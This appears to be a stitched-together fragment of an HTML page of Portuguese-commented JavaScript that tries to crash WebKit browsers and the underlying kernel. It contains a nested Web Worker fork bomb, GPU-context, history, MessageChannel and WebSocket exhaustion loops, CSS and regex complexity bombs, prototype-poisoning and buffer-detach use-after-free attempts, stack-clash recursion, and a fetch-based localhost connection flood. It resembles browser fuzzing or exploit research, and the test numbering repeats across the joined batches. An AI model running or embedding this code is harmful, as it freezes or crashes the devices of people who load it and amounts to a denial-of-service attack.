        // --- TESTE 6: GPU Context Handle Exhaustion (Kernel) ---
        function runGPUExhaust() {
            log("[KERNEL] Esgotando Contextos GPU...");
            
            const container = document.getElementById('canvases');
            let count = 0;
            
            const interval = setInterval(() => {
                // Cria canvas
                const c = document.createElement('canvas');
                c.width = 16; c.height = 16;
                container.appendChild(c);
                
                // Tenta obter contexto WebGL
                const gl = c.getContext('webgl');
                
                if (gl) {
                    count++;
                    // Força alocação de recurso
                    gl.clearColor(Math.random(), 0, 0, 1);
                    gl.clear(gl.COLOR_BUFFER_BIT);
                } else {
                    // Limite atingido?
                    // Não removemos os canvas para segurar os handles
                    log(`Contexto falhou. Total ativos: ${count}`);
                    // Continua tentando para stressar o driver
                }
                
                if (count % 20 === 0) log(`Contextos: ${count}`);
                
                // Se conseguirmos muitos, removemos alguns para tentar fragmentar
                if (container.childNodes.length > 100) {
                    container.removeChild(container.firstChild);
                }
                
                if (count > 500) {
                    clearInterval(interval);
                    log("Teste GPU finalizado.");
                }
            }, 50);
        }
 // --- TESTE 1: BigInt64Array Constructor Poisoning ---
        function runBigIntPoison() {
            log("[WebKit] Iniciando BigInt Poison...");
            
            try {
                // Objeto iterável malicioso
                const poison = {
                    length: 100, // Diz que tem 100 itens
                    [Symbol.iterator]: function*() {
                        for(let i=0; i<100; i++) {
                            yield BigInt(i);
                            // No meio da iteração, tenta invalidar o alvo? 
                            // Como não temos acesso direto ao buffer sendo construído, 
                            // tentamos causar pressão de GC ou exceções.
                            if (i == 50) {
                                log("Meio da iteração. Trigger...");
                                // Tenta alocar muita memória para forçar movimento de heap
                                const junk = new ArrayBuffer(1024*1024);
                            }
                        }
                    }
                };
                
                log("Construindo BigInt64Array...");
                const arr = new BigInt64Array(poison);
                log("Array criado (Seguro).");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: TransformStream Buffer Detach ---
        function runStreamDetach() {
            log("[WebKit] Iniciando Stream Detach...");
            
            if (!window.TransformStream) return log("Streams API off.");
            
            const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
            
            const ts = new TransformStream({
                transform(chunk, controller) {
                    log("Transformando chunk...");
                    // O GOLPE: Transfere o chunk para o worker
                    // O chunk se torna inutilizável (byteLength 0) na main thread
                    w.postMessage(chunk.buffer, [chunk.buffer]);
                    
                    // Tenta enfileirar o chunk "morto"
                    controller.enqueue(chunk);
                }
            });
            
            const writer = ts.writable.getWriter();
            const buffer = new Uint8Array([1, 2, 3, 4]);
            
            writer.write(buffer).catch(e => log("Write failed (Expected): " + e));
            
            // Tenta ler o resultado
            const reader = ts.readable.getReader();
            reader.read().then(res => {
                log("Leitura feita (Se chunk vazio, seguro).");
            }).catch(e => log("Leitura falhou: " + e));
        }

        // --- TESTE 3: CSS Complex Selector DoS ---
        function runCSSBomb() {
            log("[WebKit] Criando Seletor Complexo...");
            
            const style = document.createElement('style');
            const depth = 2000;
            
            // Cria :not(:not(:not(...)))
            let selector = "div";
            for(let i=0; i<depth; i++) selector += ":not(.c)";
            
            style.textContent = `${selector} { color: red; }`;
            
            const div = document.createElement('div');
            document.body.appendChild(div);
            
            log("Injetando regra CSS...");
            document.head.appendChild(style);
            
            // Força Recalc
            setTimeout(() => {
                const color = getComputedStyle(div).color;
                log("CSS Engine sobreviveu.");
                document.head.removeChild(style);
                document.body.removeChild(div);
            }, 100);
        }

        // --- TESTE 4: Blob.slice Recursive Stack Smash (Kernel) ---
        function runBlobStack() {
            log("[KERNEL] Iniciando Blob Stack Smash...");
            
            let blob = new Blob(["base"]);
            
            // Cria cadeia de referência: Blob -> Blob -> Blob...
            // O VFS precisa resolver a cadeia para ler os dados
            for(let i=0; i<5000; i++) {
                // Slice(0, 1) cria um novo blob referenciando o anterior
                blob = blob.slice(0, 1); 
            }
            
            log("Cadeia de 5000 slices criada. Lendo...");
            
            const reader = new FileReader();
            reader.readAsText(blob);
            
            reader.onload = () => log("Leitura OK (VFS seguro).");
            reader.onerror = () => log("Erro Leitura.");
        }

        // --- TESTE 5: Nested Worker Fork Bomb (Kernel) ---
        function runForkBomb() {
            log("[KERNEL] Iniciando Nested Fork Bomb...");
            
            const workerCode = `
                if (location.hash.length < 10) { // Limite de profundidade para não matar o browser instantaneamente
                    const depth = (parseInt(location.hash.substring(1)) || 0) + 1;
                    const blob = new Blob(["(" + arguments.callee.toString() + ")()"], {type: "text/javascript"});
                    const url = URL.createObjectURL(blob);
                    
                    // Cria 2 filhos
                    new Worker(url + "#" + depth);
                    new Worker(url + "#" + depth);
                    
                    // Mantém vivo
                    setInterval(()=>{}, 1000);
                }
            `;
            
            const blob = new Blob([workerCode], {type: "text/javascript"});
            const url = URL.createObjectURL(blob);
            
            // Inicia a árvore
            new Worker(url);
            
            log("Fork Bomb iniciada. O sistema deve travar em breve.");
        }

        // --- TESTE 6: Fetch Upload Stall (Kernel) ---
        function runUploadStall() {
            log("[KERNEL] Iniciando Upload Stall...");
            
            // Payload 10MB
            const data = new Uint8Array(10 * 1024 * 1024).fill(65);
            
            // 50 conexões
            let count = 0;
            const interval = setInterval(() => {
                if (count >= 50) { clearInterval(interval); return; }
                
                // Envia para um endpoint que aceita mas demora (ou loopback)
                // Usamos POST para forçar envio de dados
                fetch("/stall_" + count, {
                    method: "POST",
                    body: data,
                    mode: "no-cors"
                }).catch(()=>{});
                
                count++;
                if (count % 10 === 0) log(`Uploads pendentes: ${count}`);
                
            }, 100);
        }
function runISOCrash() {
            log("[WebKit] Iniciando ISO-2022-JP Attack...");
            
            try {
                const dec = new TextDecoder("iso-2022-jp");
                
                // Sequências de escape para trocar de modo (ASCII <-> Kanji)
                // ESC $ B (Kanji), ESC ( B (ASCII)
                const switchKanji = [0x1B, 0x24, 0x42];
                const switchAscii = [0x1B, 0x28, 0x42];
                
                // Cria buffer que troca de estado milhares de vezes sem dados reais
                const size = 100000;
                const buf = new Uint8Array(size * 3);
                
                for(let i=0; i<size; i++) {
                    const seq = (i % 2 === 0) ? switchKanji : switchAscii;
                    buf.set(seq, i * 3);
                }
                
                log("Decodificando stream de estado caótico...");
                // decode() deve manter o estado. O excesso de transições pode corromper.
                dec.decode(buf, {stream: true});
                
                // Finaliza com sequência quebrada
                dec.decode(new Uint8Array([0x1B, 0x24])); 
                
                log("Decoder sobreviveu.");
            } catch(e) {
                log("Erro Decoder: " + e.message);
            }
        }

        // --- TESTE 2: CSS calc() Cyclic Dependency Lock ---
        function runCSSCycle() {
            log("[WebKit] Criando Ciclo CSS...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = `
                <div id="parent" style="display:flex;">
                    <div id="child">TEST</div>
                </div>
            `;
            
            const p = document.getElementById('parent');
            const c = document.getElementById('child');
            
            // Ciclo: Parent width depende de Child width (via flex content)
            // Child width depende de Parent width (via calc %)
            // Adicionamos variação para forçar recálculo contínuo
            
            setTimeout(() => {
                log("Aplicando CSS tóxico...");
                // Tenta travar a thread de layout
                p.style.width = "min-content"; 
                c.style.width = "calc(100% + 10px)"; 
                
                // Força leitura
                const w = p.offsetWidth;
                log("Layout calculado (Seguro).");
            }, 100);
        }

        // --- TESTE 3: RegExp Unicode Property Flood ---
        function runRegexFlood() {
            log("[WebKit] Compilando Regex Unicode Massiva...");
            
            try {
                // Lista de scripts Unicode
                const scripts = ["Han", "Latin", "Greek", "Cyrillic", "Arabic", "Hebrew", "Hiragana", "Katakana"];
                let pattern = "";
                
                // Repete propriedades para gerar uma árvore de decisão gigante no compilador
                for(let i=0; i<2000; i++) {
                    const script = scripts[i % scripts.length];
                    pattern += `\\p{Script=${script}}|`;
                }
                pattern += "a";
                
                log("Compilando...");
                // A flag 'u' ativa o modo Unicode
                const re = new RegExp(pattern, "u");
                
                log("Testando string...");
                re.test("a");
                log("Regex OK.");
                
            } catch(e) {
                log("Erro Regex: " + e.message);
            }
        }

        // --- TESTE 4: MessageChannel GC Storm (Kernel) ---
        function runSocketGC() {
            log("[KERNEL] Iniciando Socket GC Storm...");
            
            let count = 0;
            const interval = setInterval(() => {
                // Cria 1000 canais por ciclo
                for(let i=0; i<1000; i++) {
                    const mc = new MessageChannel();
                    // Entrelaça as portas para criar referência circular (Cross-thread)
                    // O Kernel precisa detetar que ambos os lados estão inalcançáveis
                    mc.port1.postMessage("cycle", [mc.port2]);
                    
                    // Descarta referência JS imediatamente
                }
                
                count += 1000;
                if (count % 5000 === 0) log(`Canais criados e descartados: ${count}`);
                
                if (count > 50000) {
                    clearInterval(interval);
                    
                    // Força alocação para disparar GC do JS, que por sua vez notifica o Kernel
                    const buffer = new ArrayBuffer(50 * 1024 * 1024);
                    log("Teste finalizado. Aguardando limpeza do Kernel...");
                }
            }, 50);
        }

        // --- TESTE 5: History Session Exhaustion (Kernel) ---
        function runHistoryDoS() {
            log("[KERNEL] Enchendo Sessão de Histórico...");
            
            const state = { data: "A".repeat(1024) }; // 1KB state
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    // pushState adiciona nova entrada. O sistema limita o número?
                    // Ou crasha por OOM no processo pai?
                    for(let i=0; i<100; i++) {
                        history.pushState(state, "", "/flood_" + count);
                        count++;
                    }
                    
                    if (count % 5000 === 0) log(`Entradas no histórico: ${count}`);
                    
                } catch(e) {
                    log("Limite atingido: " + e.message);
                    clearInterval(interval);
                }
            }, 10);
        }

        // --- TESTE 6: Worker Termination Signal Race (Kernel) ---
        function runSignalRace() {
            log("[KERNEL] Iniciando Signal Race...");
            
            const workerCode = `
                onmessage = () => {
                    // Loop infinito (bloqueia thread)
                    while(true) {}
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            const workers = [];
            
            // Lança 10 workers bloqueados
            for(let i=0; i<10; i++) {
                const w = new Worker(url);
                w.postMessage("start"); // Bloqueia o worker
                workers.push(w);
            }
            
            log("Workers bloqueados. Terminando e enviando mensagens...");
            
            // Race: Terminar vs Enviar Mensagem
            // O Kernel está a enviar SIGKILL. Nós tentamos escrever no pipe do socket.
            workers.forEach(w => {
                setTimeout(() => {
                    w.terminate(); // Envia sinal
                    // Tenta escrever no pipe de uma thread morta/morrendo
                    try { w.postMessage("race"); } catch(e){}
                }, 100);
            });
            
            setTimeout(() => log("Race executada."), 2000);
        }
// --- TESTE 1: AudioWorklet Module Load Race ---
        function runAudioRace() {
            log("[WebKit] Iniciando AudioWorklet Race...");
            
            if (!window.AudioWorklet) return log("AudioWorklet off.");
            
            try {
                // Cria contexto
                let ctx = new AudioContext();
                
                // Código do processador
                const blob = new Blob([`
                    registerProcessor('noise', class extends AudioWorkletProcessor {
                        process(inputs, outputs) { return true; }
                    });
                `], {type: 'application/javascript'});
                const url = URL.createObjectURL(blob);
                
                // Adiciona módulo
                const p = ctx.audioWorklet.addModule(url);
                
                // O GOLPE: Fecha o contexto IMEDIATAMENTE enquanto o módulo carrega na outra thread
                setTimeout(() => {
                    log("Fechando contexto durante load...");
                    ctx.close();
                    ctx = null;
                }, 0);
                
                p.then(() => log("Módulo carregou (Race falhou, seguro)."))
                 .catch(e => log("Erro Load: " + e.message));
                 
            } catch(e) {
                log("Erro Audio: " + e.message);
            }
        }

        // --- TESTE 2: SVG Filter Cyclic Recursion ---
        function runSVGCycle() {
            log("[WebKit] Criando SVG Filter Cycle...");
            const box = document.getElementById('svg-box');
            box.innerHTML = "";
            
            const ns = "http://www.w3.org/2000/svg";
            const svg = document.createElementNS(ns, "svg");
            const defs = document.createElementNS(ns, "defs");
            
            // Filtro A refere B
            const fA = document.createElementNS(ns, "filter");
            fA.id = "filterA";
            const imgA = document.createElementNS(ns, "feImage");
            imgA.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#filterB");
            fA.appendChild(imgA);
            
            // Filtro B refere A (Ciclo)
            const fB = document.createElementNS(ns, "filter");
            fB.id = "filterB";
            const imgB = document.createElementNS(ns, "feImage");
            imgB.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#filterA");
            fB.appendChild(imgB);
            
            defs.appendChild(fA);
            defs.appendChild(fB);
            svg.appendChild(defs);
            
            // Elemento alvo
            const rect = document.createElementNS(ns, "rect");
            rect.setAttribute("width", "100");
            rect.setAttribute("height", "100");
            rect.setAttribute("filter", "url(#filterA)"); // Gatilho
            
            svg.appendChild(rect);
            box.appendChild(svg);
            
            log("SVG injetado. Verifique crash.");
            
            setTimeout(() => {
                box.innerHTML = "";
                log("SVG Test finalizado.");
            }, 2000);
        }

        // --- TESTE 3: Intl.Segmenter Iterator UAF ---
        function runSegmenterUAF() {
            log("[WebKit] Iniciando Segmenter UAF...");
            
            if (!window.Intl || !Intl.Segmenter) return log("Segmenter off.");
            
            try {
                const seg = new Intl.Segmenter("ja", {granularity: "word"});
                let str = "????????"; // String base
                
                const segments = seg.segment(str);
                const iter = segments[Symbol.iterator]();
                
                // Avança um pouco
                iter.next();
                
                log("Iterador ativo. Destruindo string original...");
                
                // Tenta remover referência à string original
                str = null;
                
                // Aloca memória para sobrescrever
                const junk = new Array(10000).fill(1.1);
                
                // Tenta continuar a iterar
                const res = iter.next();
                log("Iteração continuou: " + (res.value ? res.value.segment : "Fim"));
                
            } catch(e) {
                log("Erro Intl: " + e.message);
            }
        }

        // --- TESTE 4: Wasm mprotect Thrashing (Kernel) ---
        function runWasmProtect() {
            log("[KERNEL] Iniciando Wasm mprotect Thrashing...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            // Binário Wasm mínimo (Magic + Version)
            const wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);
            
            let count = 0;
            const interval = setInterval(() => {
                try {
                    // Compilar e instanciar força o Kernel a:
                    // 1. Alocar memória RW
                    // 2. Escrever código JIT/Optimizado
                    // 3. Chamar mprotect(RW -> RX)
                    // 4. Executar
                    // 5. Desalocar
                    for(let i=0; i<50; i++) {
                        new WebAssembly.Instance(new WebAssembly.Module(wasmCode));
                    }
                    count += 50;
                    if (count % 1000 === 0) log(`Módulos Wasm: ${count}`);
                } catch(e) {
                    log("Wasm falhou: " + e.message);
                    clearInterval(interval);
                }
                
                if (count > 10000) {
                    clearInterval(interval);
                    log("mprotect Thrash finalizado.");
                }
            }, 10);
        }

        // --- TESTE 5: Canvas Path VRAM Leak (Kernel) ---
        function runCanvasLeak() {
            log("[KERNEL] Iniciando Canvas Path Leak...");
            
            const ctx = document.getElementById('c').getContext('2d');
            
            let count = 0;
            const interval = setInterval(() => {
                // Cria caminho complexo
                ctx.beginPath();
                for(let i=0; i<1000; i++) {
                    ctx.lineTo(Math.random()*1000, Math.random()*1000);
                }
                // Preenche (usa GPU tessellation)
                ctx.fillStyle = "red";
                ctx.fill();
                
                // Limpa (deve libertar buffers)
                ctx.clearRect(0,0,1000,1000);
                
                count++;
                if (count % 500 === 0) log(`Ciclos de Desenho: ${count}`);
                
                if (count > 5000) {
                    clearInterval(interval);
                    log("Canvas Test finalizado.");
                }
            }, 5);
        }

        // --- TESTE 6: Socket Linger Ghost Close (Kernel) ---
        function runLingerGhost() {
            log("[KERNEL] Iniciando Linger Ghost...");
            
            const data = new Uint8Array(1024).fill(65);
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    const ws = new WebSocket("wss://echo.websocket.org");
                    
                    ws.onopen = () => {
                        // Envia dados
                        ws.send(data);
                        // Fecha com dados ainda no buffer de saída
                        // Isso força o Kernel a decidir: Esperar (Linger) ou RST?
                        ws.close(); 
                    };
                    ws.onerror = () => {};
                    
                    count++;
                } catch(e) {}
                
                if (count > 500) {
                    clearInterval(interval);
                    log("Teste Linger finalizado.");
                }
            }, 10);
        }
// --- TESTE 1: History Back vs Iframe Destroy Race ---
        function runHistoryRace() {
            log("[WebKit] Iniciando History Race...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "";
            
            const ifr = document.createElement('iframe');
            sandbox.appendChild(ifr);
            
            // Cria histórico no iframe
            ifr.src = window.location.href + "#1";
            
            setTimeout(() => {
                ifr.src = window.location.href + "#2";
                
                setTimeout(() => {
                    log("Voltando no histórico e destruindo iframe...");
                    // 1. Inicia navegação (Assíncrono no processo Web)
                    try { ifr.contentWindow.history.back(); } catch(e){}
                    
                    // 2. Destroi o contexto de navegação (Imediato)
                    // O HistoryController pode tentar callback no frame morto
                    sandbox.removeChild(ifr);
                    
                    log("Race executada.");
                }, 500);
            }, 500);
        }

        // --- TESTE 2: CSS Viewport Unit Recursion ---
        function runViewportLoop() {
            log("[WebKit] Iniciando Viewport Loop...");
            
            const style = document.createElement('style');
            // Se a largura for pequena, remove scrollbar. Se for grande, adiciona scrollbar.
            // Scrollbar altera '100vw'. '100vw' altera a largura. Ciclo.
            style.textContent = `
                #v-bomb {
                    width: 100vw;
                    height: 100vh;
                    overflow: auto;
                }
                #content {
                    width: 110vw; /* Força scroll horizontal se scrollbar vertical aparecer? */
                    height: 110vh;
                }
                @media (max-width: 1000px) {
                    #content { height: 90vh; } /* Remove scroll */
                }
            `;
            document.head.appendChild(style);
            
            const div = document.createElement('div');
            div.id = "v-bomb";
            div.innerHTML = "<div id='content'></div>";
            document.body.appendChild(div);
            
            log("Layout instável injetado. Verifique travamento.");
            
            setTimeout(() => {
                document.head.removeChild(style);
                document.body.removeChild(div);
                log("Teste CSS finalizado.");
            }, 5000);
        }

        // --- TESTE 3: DataView Getter Poisoning ---
        function runDataViewPoison() {
            log("[WebKit] Iniciando DataView Poison...");
            
            try {
                const buffer = new ArrayBuffer(16);
                const view = new DataView(buffer);
                
                // Define getter malicioso no protótipo (afeta todos os ArrayBuffers)
                Object.defineProperty(ArrayBuffer.prototype, 'byteLength', {
                    get: function() {
                        log("Getter ativado! Tentando detach...");
                        // Se possível, transfere o buffer aqui
                        try {
                            const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
                            w.postMessage(this, [this]); 
                            w.terminate();
                        } catch(e) {}
                        return 16; // Mente sobre o tamanho
                    },
                    configurable: true
                });
                
                log("Lendo DataView...");
                // O DataView verifica byteLength. O nosso getter roda e mata o buffer.
                // O C++ continua e lê memória morta?
                view.getInt8(0);
                
                log("Leitura segura (ou falhou antes).");
                delete ArrayBuffer.prototype.byteLength; // Limpa
                
            } catch(e) {
                log("Erro: " + e.message);
                delete ArrayBuffer.prototype.byteLength;
            }
        }

        // --- TESTE 4: Worker Stack Clash (Kernel) ---
        function runStackClash() {
            log("[KERNEL] Iniciando Stack Clash (Recursion)...");
            
            const workerCode = `
                function recurse(i) {
                    // Aloca variáveis na stack
                    const v = new Float64Array(100); 
                    try {
                        recurse(i+1);
                    } catch(e) {
                        // Se capturar RangeError, é JS Stack limit.
                        // Queremos estourar a thread stack nativa antes disso.
                    }
                }
                recurse(0);
            `;
            
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança vários workers para colocar stacks adjacentes na memória
            for(let i=0; i<20; i++) {
                new Worker(url);
            }
            log("Workers recursivos lançados. Aguarde impacto.");
        }

        // --- TESTE 5: Kqueue Event Filter Exhaustion (Kernel) ---
        function runKqueueFlood() {
            log("[KERNEL] Iniciando Kqueue Flood...");
            
            const div = document.createElement('div');
            let count = 0;
            
            const interval = setInterval(() => {
                // Adiciona e remove listeners freneticamente
                // Cada addEventListener regista um filtro no kqueue do processo
                for(let i=0; i<1000; i++) {
                    const fn = () => {};
                    div.addEventListener('click', fn);
                    // Não removemos imediatamente para aumentar a carga
                }
                
                // Limpeza em lote
                div.innerHTML = ""; // Tenta forçar limpeza de listeners associados
                
                count += 1000;
                if (count % 5000 === 0) log(`Listeners ciclados: ${count}`);
                
                if (count > 50000) {
                    clearInterval(interval);
                    log("Teste Kqueue finalizado.");
                }
            }, 10);
        }

        // --- TESTE 6: TCP SYN Backlog Flood (Kernel) ---
        function runSynBacklog() {
            log("[KERNEL] Iniciando SYN Flood (Local)...");
            
            let count = 0;
            const interval = setInterval(() => {
                // Tenta conectar a IPs locais aleatórios
                // O Kernel envia SYN e aloca estrutura de conexão incompleta
                for(let i=0; i<50; i++) {
                    const ip = `127.0.0.${(count % 250) + 1}`;
                    const port = 8000 + (count % 1000);
                    
                    fetch(`http://${ip}:${port}`, { mode: 'no-cors', signal: AbortSignal.timeout(2000) })
                        .catch(()=>{});
                }
                
                count++;
                if (count % 100 === 0) log(`Tentativas de conexão: ${count * 50}`);
                
                if (count > 500) {
                    clearInterval(interval);
                    log("Flood finalizado.");
                }
            }, 50);
        }


    </script>
</body>
</html>